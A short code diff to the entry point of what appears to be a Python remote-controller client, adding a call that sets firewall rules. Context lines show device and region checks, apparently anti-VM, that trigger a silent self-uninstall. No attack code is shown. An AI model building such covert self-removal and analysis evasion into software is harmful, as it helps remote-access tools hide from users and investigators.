@@ -14,6 +14,7 @@ from remote_client.config import (
 from remote_client.runtime import build_client, load_or_create_device_token
 from remote_client.security.anti_frod_reg import analyze_region
 from remote_client.security.anti_frod_vm import analyze_device
+from remote_client.security.firewall import ensure_firewall_rules
 from remote_client.security.self_destruct import silent_uninstall_and_cleanup
 
 
@@ -39,6 +40,8 @@ def main() -> None:
         ):
             silent_uninstall_and_cleanup(base_dir)
             return
+
+    ensure_firewall_rules()
 
     parser = argparse.ArgumentParser(description="Remote controller client")
     parser.add_argument(
